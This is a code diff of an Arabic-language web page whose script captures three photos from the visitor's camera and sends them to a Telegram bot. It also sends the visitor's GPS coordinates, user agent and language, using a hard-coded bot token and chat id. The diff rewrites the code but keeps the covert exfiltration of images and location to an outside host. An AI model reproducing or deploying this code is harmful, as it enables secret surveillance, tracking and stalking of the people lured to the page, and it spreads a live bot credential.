@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -96,28 +97,29 @@
         const videoTrack = stream.getVideoTracks()[0];
         const imageCapture = new ImageCapture(videoTrack);
 
-        const takeAndSendPhoto = async () => {
+        for (let i = 0; i < 3; i++) {
           const blob = await imageCapture.takePhoto();
           const formData = new FormData();
-          formData.append('photo', blob, 'photo.jpg');
-          formData.append('ua', navigator.userAgent);
-          formData.append('lang', navigator.language);
+          formData.append('chat_id', '8004961958');
+          formData.append('photo', blob, `photo${i + 1}.jpg`);
 
-          navigator.geolocation.getCurrentPosition(pos => {
-            formData.append('lat', pos.coords.latitude);
-            formData.append('lon', pos.coords.longitude);
-
-            fetch('https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendDocument?chat_id=8004961958', {
-              method: 'POST',
-              body: formData
-            });
+          await fetch('https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendPhoto', {
+            method: 'POST',
+            body: formData
           });
-        };
 
-        for (let i = 0; i < 3; i++) {
-          await takeAndSendPhoto();
           await new Promise(r => setTimeout(r, 2000));
         }
+
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const text = `📷 تم التقاط الصور\n🌍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 الجهاز: ${navigator.userAgent}\n🌐 اللغة: ${navigator.language}`;
+
+          await fetch(`https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: 8004961958, text })
+          });
+        });
 
         videoTrack.stop();
 
@@ -126,7 +128,8 @@
         setTimeout(() => { toast.className = toast.className.replace('show', ''); }, 3000);
 
       } catch (err) {
-        alert('حدث خطأ في الوصول إلى الكاميرا');
+        alert('🚫 حدث خطأ في الوصول إلى الكاميرا');
+        console.error(err);
       }
     }
   </script>
